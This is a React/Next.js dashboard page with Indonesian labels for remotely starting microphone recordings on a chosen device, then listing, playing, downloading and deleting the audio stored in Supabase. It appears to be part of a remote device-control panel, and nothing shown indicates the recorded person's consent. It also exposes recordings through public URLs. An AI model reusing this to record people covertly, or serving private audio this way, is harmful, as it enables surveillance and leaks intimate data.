'use client';

import React, { useEffect, useState } from 'react';
import {
  Mic, MicOff, RefreshCw, Loader2, AlertTriangle, Play, Pause,
  Trash2, Download, Clock, CheckCircle2, XCircle, Radio,
} from 'lucide-react';
import { supabase } from '../../../lib/supabase';

interface MicCommand {
  id: number;
  device_id: string;
  duration_seconds: number;
  status: string;
  storage_path: string | null;
  file_size_bytes: number | null;
  error_message: string | null;
  created_at: string;
  executed_at: string | null;
}

function formatBytes(b?: number | null) {
  if (!b) return '—';
  if (b < 1024) return `${b} B`;
  if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
  return `${(b / 1024 / 1024).toFixed(1)} MB`;
}
function timeAgo(iso: string) {
  const m = (Date.now() - new Date(iso).getTime()) / 60000;
  if (m < 1) return 'Baru saja';
  if (m < 60) return `${Math.floor(m)} mnt lalu`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h} jam lalu`;
  return `${Math.floor(h / 24)} hari lalu`;
}

const PRESET_DURATIONS = [5, 10, 30, 60, 120, 300];

export default function MicrophonePage() {
  const [loading, setLoading]       = useState(true);
  const [device, setDevice]         = useState<any>(null);
  const [commands, setCommands]     = useState<MicCommand[]>([]);
  const [error, setError]           = useState<string | null>(null);

  const [duration, setDuration]     = useState(5);
  const [customDur, setCustomDur]   = useState('');
  const [useCustom, setUseCustom]   = useState(false);
  const [triggering, setTriggering] = useState(false);
  const [trigOk, setTrigOk]         = useState(false);
  const [refreshing, setRefreshing] = useState(false);
  const [deletingIds, setDeletingIds] = useState<Set<number>>(new Set());

  // Audio player state
  const [playingId, setPlayingId]   = useState<number | null>(null);
  const [audioUrls, setAudioUrls]   = useState<Record<number, string>>({});

  const [clearingAll, setClearingAll]   = useState(false);
  const [confirmClear, setConfirmClear] = useState(false);

  const fetchData = async (dev?: any, silent = false) => {
    const target = dev || device;
    if (!target) return;
    if (!silent) setRefreshing(true);
    try {
      const { data, error: e } = await supabase
        .from('microphone_commands')
        .select('*')
        .eq('device_id', target.id)
        .order('created_at', { ascending: false })
        .limit(100);
      if (e) throw e;
      setCommands(data || []);
      setError(null);
    } catch (err: any) {
      setError(err?.message ?? 'Gagal memuat data');
    } finally {
      setRefreshing(false);
    }
  };

  useEffect(() => {
    const init = async () => {
      setLoading(true);
      try {
        const { data } = await supabase.from('devices').select('*').order('created_at', { ascending: false });
        if (!data?.length) return;
        const saved = localStorage.getItem('selected_device_id');
        const dev = data.find((d: any) => d.id === saved) || data[0];
        setDevice(dev);
        await fetchData(dev, true);
      } finally { setLoading(false); }
    };
    init();
  }, []);

  // Realtime updates
  useEffect(() => {
    if (!device) return;
    const channel = supabase
      .channel('mic-commands')
      .on('postgres_changes', {
        event: '*', schema: 'public', table: 'microphone_commands',
        filter: `device_id=eq.${device.id}`,
      }, () => fetchData(device, true))
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [device]);

  const effectiveDuration = useCustom ? Math.min(600, Math.max(1, parseInt(customDur) || 5)) : duration;

  const handleTrigger = async () => {
    if (!device || triggering) return;
    setTriggering(true); setTrigOk(false);
    try {
      const { error: e } = await supabase
        .from('microphone_commands')
        .insert({ device_id: device.id, duration_seconds: effectiveDuration, status: 'PENDING' });
      if (e) throw e;
      setTrigOk(true);
      setTimeout(() => setTrigOk(false), 4000);
      await fetchData(device, true);
    } catch (err: any) {
      setError(err?.message ?? 'Gagal mengirim perintah');
    } finally { setTriggering(false); }
  };

  const handlePlay = (cmd: MicCommand) => {
    if (!cmd.storage_path) return;
    // Toggle: klik lagi untuk tutup player
    if (playingId === cmd.id) { setPlayingId(null); return; }

    // Pakai cache atau buat public URL (synchronous, tidak perlu API call)
    if (!audioUrls[cmd.id]) {
      const { data } = supabase.storage.from('audio-recordings').getPublicUrl(cmd.storage_path);
      setAudioUrls(prev => ({ ...prev, [cmd.id]: data.publicUrl }));
    }
    setPlayingId(cmd.id);
  };

  const handleDelete = async (cmd: MicCommand) => {
    setDeletingIds(prev => new Set(prev).add(cmd.id));
    if (playingId === cmd.id) { setPlayingId(null); }
    setCommands(prev => prev.filter(c => c.id !== cmd.id));
    await supabase.from('microphone_commands').delete().eq('id', cmd.id);
    if (cmd.storage_path) await supabase.storage.from('audio-recordings').remove([cmd.storage_path]);
    setDeletingIds(prev => { const n = new Set(prev); n.delete(cmd.id); return n; });
  };

  const counts = {
    total: commands.length,
    executed: commands.filter(c => c.status === 'EXECUTED').length,
    pending: commands.filter(c => c.status === 'PENDING').length,
    failed: commands.filter(c => c.status === 'FAILED').length,
  };

  const handleClearAll = async () => {
    if (!device) return;
    if (!confirmClear) { setConfirmClear(true); return; }
    setClearingAll(true);
    setConfirmClear(false);
    try {
      // Delete storage files
      const { data: rows } = await supabase.from('microphone_commands').select('storage_path').eq('device_id', device.id);
      if (rows && rows.length > 0) {
        const paths = rows.map((r: any) => r.storage_path).filter(Boolean);
        for (let i = 0; i < paths.length; i += 100) {
          await supabase.storage.from('audio-recordings').remove(paths.slice(i, i + 100));
        }
      }
      // Delete DB rows
      await supabase.from('microphone_commands').delete().eq('device_id', device.id);
      await fetchData();
    } catch (err: any) {
      console.error('Clear all failed', err);
    } finally {
      setClearingAll(false);
    }
  };

  if (loading) return (
    <div className="flex items-center justify-center min-h-[60vh] gap-3 text-textSecondary">
      <Loader2 className="animate-spin text-accentViolet" size={36} />
      <p className="text-sm">Memuat data rekaman...</p>
    </div>
  );

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Rekam Mikrofon</h1>
          <p className="text-textSecondary mt-1 text-sm">
            Rekam audio dari mikrofon perangkat secara remote
          </p>
        </div>
        <button onClick={() => fetchData()} className="p-2.5 glass-card rounded-xl text-textSecondary hover:text-textPrimary">
          <RefreshCw size={16} className={refreshing ? 'animate-spin' : ''} />
        </button>
          <button
            onClick={handleClearAll}
            disabled={clearingAll || !device}
            onMouseLeave={() => setConfirmClear(false)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold transition-all disabled:opacity-40 ${
              confirmClear
                ? 'bg-red-600 text-white animate-pulse'
                : 'glass-card text-accentRed/70 hover:bg-red-950/30 hover:text-accentRed border border-red-900/20'
            }`}
          >
            {clearingAll ? <Loader2 size={13} className="animate-spin" /> : <Trash2 size={13} />}
            {clearingAll ? 'Menghapus...' : confirmClear ? 'Konfirmasi hapus semua?' : 'Hapus Semua Rekaman'}
          </button>
      </div>

      {error && (
        <div className="flex gap-3 p-4 bg-red-950/30 border border-red-900/40 rounded-xl">
          <AlertTriangle size={16} className="text-red-400 shrink-0 mt-0.5" />
          <p className="text-red-300 text-xs">{error}</p>
        </div>
      )}

      {/* Stats */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
        {[
          { label: 'Total Rekaman', value: counts.total,    color: 'text-accentViolet' },
          { label: 'Berhasil',      value: counts.executed, color: 'text-accentGreen'  },
          { label: 'Menunggu',      value: counts.pending,  color: 'text-accentYellow' },
          { label: 'Gagal',         value: counts.failed,   color: 'text-accentRed'    },
        ].map((s, i) => (
          <div key={i} className="glass-card rounded-xl p-4 text-center">
            <p className={`text-2xl font-bold ${s.color}`}>{s.value}</p>
            <p className="text-[11px] text-textSecondary mt-0.5">{s.label}</p>
          </div>
        ))}
      </div>

      {/* Trigger panel */}
      <div className="glass-card rounded-2xl p-6">
        <h2 className="text-base font-bold mb-4 flex items-center gap-2">
          <Mic size={18} className="text-accentViolet" /> Mulai Perekaman
        </h2>

        {/* Duration picker */}
        <div className="mb-4">
          <p className="text-xs text-textSecondary mb-2 font-medium">Durasi Rekaman</p>
          <div className="flex flex-wrap gap-2 mb-3">
            {PRESET_DURATIONS.map(d => (
              <button key={d} onClick={() => { setDuration(d); setUseCustom(false); }}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors ${
                  !useCustom && duration === d
                    ? 'bg-accentViolet text-white'
                    : 'glass-card text-textSecondary hover:text-textPrimary'
                }`}>
                {d < 60 ? `${d}s` : `${d / 60}m`}
              </button>
            ))}
            <button onClick={() => setUseCustom(true)}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors ${
                useCustom ? 'bg-accentViolet text-white' : 'glass-card text-textSecondary hover:text-textPrimary'
              }`}>
              Custom
            </button>
          </div>
          {useCustom && (
            <div className="flex items-center gap-2">
              <input type="number" min={1} max={600} value={customDur}
                onChange={e => setCustomDur(e.target.value)}
                placeholder="Detik (1–600)"
                className="w-40 px-3 py-2 text-xs bg-darkBg border border-borderDark rounded-lg text-textPrimary focus:outline-none focus:border-accentViolet focus:ring-1 focus:ring-accentViolet/30"
              />
              <span className="text-xs text-textSecondary">detik (maks 10 menit)</span>
            </div>
          )}
        </div>

        {/* Info strip */}
        <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-accentViolet/5 border border-accentViolet/20 mb-4 w-fit">
          <Clock size={13} className="text-accentViolet shrink-0" />
          <span className="text-xs text-violetLight font-semibold">
            Durasi: <strong>{effectiveDuration < 60 ? `${effectiveDuration} detik` : `${Math.floor(effectiveDuration / 60)} menit ${effectiveDuration % 60 > 0 ? `${effectiveDuration % 60}s` : ''}`}</strong>
            {' '}· Rekaman disimpan di <code className="text-[11px]">audio-recordings</code> bucket
          </span>
        </div>

        {/* Trigger button */}
        <button
          onClick={handleTrigger}
          disabled={triggering || !device}
          className={`inline-flex items-center gap-2 px-5 py-3 rounded-xl text-sm font-bold transition-all disabled:opacity-50 ${
            trigOk
              ? 'bg-accentGreen/15 text-accentGreen border border-accentGreen/30'
              : 'bg-accentViolet text-white hover:bg-accentViolet/80'
          }`}
        >
          {triggering ? <Loader2 size={16} className="animate-spin" />
            : trigOk ? <CheckCircle2 size={16} />
            : <Radio size={16} />}
          {triggering ? 'Mengirim...' : trigOk ? 'Perintah Terkirim!' : 'Mulai Rekam'}
        </button>
        {trigOk && (
          <p className="text-xs text-textSecondary mt-2">
            Perangkat akan mulai merekam dalam ~15 detik. Hasil muncul otomatis di bawah.
          </p>
        )}
      </div>

      {/* Recordings list */}
      {commands.length === 0 ? (
        <div className="glass-card rounded-2xl p-12 text-center">
          <MicOff size={40} className="text-textSecondary/20 mx-auto mb-3" />
          <p className="text-sm text-textSecondary">Belum ada rekaman.</p>
        </div>
      ) : (
        <div className="glass-card rounded-2xl overflow-hidden">
          <div className="px-5 py-3 border-b border-borderDark/50">
            <h2 className="text-sm font-bold text-textSecondary uppercase tracking-wider">Riwayat Rekaman</h2>
          </div>
          <div className="divide-y divide-borderDark/30">
            {commands.map(cmd => {
              const isPlaying = playingId === cmd.id;
              const statusCfg = {
                EXECUTED: { color: 'text-accentGreen',  bg: 'bg-accentGreen/10',  Icon: CheckCircle2, label: 'Berhasil' },
                PENDING:  { color: 'text-accentYellow', bg: 'bg-accentYellow/10', Icon: Clock,        label: 'Menunggu' },
                FAILED:   { color: 'text-accentRed',    bg: 'bg-red-950/30',      Icon: XCircle,      label: 'Gagal'    },
              }[cmd.status] ?? { color: 'text-textSecondary', bg: 'bg-cardBg', Icon: Clock, label: cmd.status };
              const StatusIcon = statusCfg.Icon;

              const audioUrl = audioUrls[cmd.id];
              return (
                <div key={cmd.id} className="px-5 py-4">
                  <div className="flex items-center gap-4">
                    {/* Play / Stop button */}
                    <button
                      onClick={() => handlePlay(cmd)}
                      disabled={cmd.status !== 'EXECUTED' || !cmd.storage_path}
                      className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 transition-all disabled:opacity-30 ${
                        cmd.status === 'EXECUTED'
                          ? isPlaying
                            ? 'bg-accentViolet text-white'
                            : 'bg-accentViolet/15 text-accentViolet hover:bg-accentViolet/30'
                          : 'bg-cardBg text-textSecondary'
                      }`}
                      title={isPlaying ? 'Tutup player' : 'Putar rekaman'}
                    >
                      {isPlaying ? <Pause size={16} /> : <Play size={16} />}
                    </button>

                    {/* Info */}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className={`inline-flex items-center gap-1 text-[10px] font-bold px-2 py-0.5 rounded-full ${statusCfg.bg} ${statusCfg.color}`}>
                          <StatusIcon size={10} />
                          {statusCfg.label}
                        </span>
                        <span className="text-xs font-semibold text-textPrimary">
                          {cmd.duration_seconds < 60 ? `${cmd.duration_seconds} detik` : `${Math.floor(cmd.duration_seconds / 60)} menit`}
                        </span>
                        <span className="text-xs text-textSecondary">{formatBytes(cmd.file_size_bytes)}</span>
                      </div>
                      <p className="text-[10px] text-textSecondary/70 mt-0.5">{timeAgo(cmd.created_at)}</p>
                      {cmd.status === 'FAILED' && cmd.error_message && (
                        <p className="text-[10px] text-accentRed/80 mt-0.5 truncate">{cmd.error_message}</p>
                      )}
                    </div>

                    {/* Actions */}
                    <div className="flex items-center gap-1 shrink-0">
                      {cmd.status === 'EXECUTED' && cmd.storage_path && (
                        <a
                          href={audioUrl || supabase.storage.from('audio-recordings').getPublicUrl(cmd.storage_path).data.publicUrl}
                          download={`recording_${cmd.id}.m4a`}
                          className="p-1.5 rounded-lg text-textSecondary/40 hover:text-accentBlue hover:bg-accentBlue/10 transition-all"
                          title="Unduh"
                        >
                          <Download size={13} />
                        </a>
                      )}
                      <button onClick={() => handleDelete(cmd)} disabled={deletingIds.has(cmd.id)}
                        className="p-1.5 rounded-lg text-textSecondary/40 hover:text-accentRed hover:bg-red-500/10 transition-all disabled:opacity-30"
                        title="Hapus">
                        {deletingIds.has(cmd.id) ? <Loader2 size={13} className="animate-spin" /> : <Trash2 size={13} />}
                      </button>
                    </div>
                  </div>

                  {/* Inline audio player */}
                  {isPlaying && audioUrl && (
                    <div className="mt-3">
                      <audio
                        key={audioUrl}
                        src={audioUrl}
                        controls
                        autoPlay
                        className="w-full h-10"
                        onEnded={() => setPlayingId(null)}
                        style={{ colorScheme: 'dark' }}
                      />
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}
